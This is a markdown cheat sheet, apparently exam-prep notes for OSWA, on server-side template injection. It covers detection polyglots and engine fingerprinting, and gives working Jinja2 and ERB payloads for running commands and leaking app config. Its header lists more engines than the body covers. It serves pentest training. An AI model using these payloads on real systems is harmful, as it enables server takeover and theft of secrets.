---
category: OSWA Web App Pentesting
order: 5
summary: Detection polyglots and engine fingerprinting, per-engine RCE payloads (Jinja2, Twig, Freemarker, Pug, Handlebars), and SSTImap/Tplmap.
---
# SSTI

## Universal polyglot (try this first, any suspicious field)
```
${{<%[%'"}}%\.
```
If the engine is vulnerable, this almost always throws a verbose error or visibly breaks the page.

## Common tag syntax to probe with
Try each wrapping a math expression (`7*7`) — whichever evaluates to `49` tells you the delimiter style:
```
{{ 7*7 }}        ${ 7*7 }        #{ 7*7 }        <%= 7*7 %>
{ 7*7 }          {{= 7*7 }}      {= 7*7 }        *{ 7*7 }
@{ 7*7 }         @( 7*7 )
```

## Detection techniques
| Technique | When to use | How |
|---|---|---|
| Rendered | Output reflected on page | `7*7` → look for `49` in the response |
| Error-based | Verbose errors shown | `(1/0).zxy.zxy` — error text often names the language |
| Boolean-based | No output/errors, but behavior differs | Valid expr vs. deliberately broken one, compare responses |
| Time-based | Fully blind | Delay function inside the expression |
| Out-of-band | Fully blind, no timing signal | Payload makes the server `curl`/`wget` your listener |

## Error-based engine identification
Send `(1/0).zxy.zxy` and read the error text:

| Error text contains | Language |
|---|---|
| `ZeroDivisionError` | Python |
| `java.lang.ArithmeticException` | Java |
| `ReferenceError` / `TypeError` | NodeJS |
| `Division by zero` / `DivisionByZeroError` | PHP |
| `divided by 0` | Ruby |
| `Arithmetic operation failed` | Freemarker (Java) |

## Jinja2 (Python/Flask) — common on OSWA targets
Discovery: `{{5*'5'}}` → `'55555'` (Python repeats the string — distinct from Twig's `49` or Freemarker's error).

Leak secrets (no RCE needed):
```jinja2
{{config|pprint}}
```

RCE:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
If blocked, enumerate subclasses for `subprocess.Popen`:
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
Index varies per target/Python version — always re-check.

## ERB (Ruby)
```erb
<%= 7*7 %>                                    # confirm (49)
<%= `id` %>                                   # RCE via backticks
<%= system('id') %>
<%= IO.popen('id').read %>
```
Delimiters: `<% %>` (no output) / `<%= %>` (outputs result). Rails views (`.html.erb`) are the most likely place to find this.

## Tools
| Tool | OSWA exam status |
|---|---|
| [tplmap](https://github.com/epinna/tplmap) | Permitted — named explicitly on OffSec's allowed tool list |
| [SSTImap](https://github.com/vladko312/SSTImap) | Not in the written list, but confirmed allowed on OffSec's official Discord |
| [TInjA](https://github.com/Hackmanit/TInjA) | Not named in the official list |

## Reference links
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- OffSec OSWA Exam Guide — permitted tools list
